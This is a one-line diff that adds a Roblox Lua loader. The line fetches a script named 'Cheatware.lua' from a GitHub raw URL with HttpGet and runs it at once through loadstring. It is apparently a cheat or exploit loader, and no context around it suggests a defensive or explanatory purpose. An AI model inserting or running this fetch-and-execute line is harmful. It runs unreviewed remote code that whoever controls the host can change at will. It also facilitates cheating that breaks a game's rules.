@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Cheatware-stack/Cheatware/refs/heads/main/Cheatware.lua"))()
